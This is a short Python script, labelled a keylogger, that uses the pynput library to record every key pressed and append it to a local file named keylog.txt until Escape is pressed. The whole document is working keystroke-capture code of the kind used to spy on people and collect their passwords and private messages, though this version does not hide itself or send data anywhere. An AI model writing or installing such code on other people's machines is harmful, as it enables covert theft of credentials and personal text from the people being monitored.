#!/bin/python3

from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        if key == Key.space:
            with open("keylog.txt", "a") as f:
                f.write(" ")
        else:
            with open("keylog.txt", "a") as f:
                f.write(f"[{str(key)}]")

def on_release(key):
    if key == Key.esc:
        return False

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
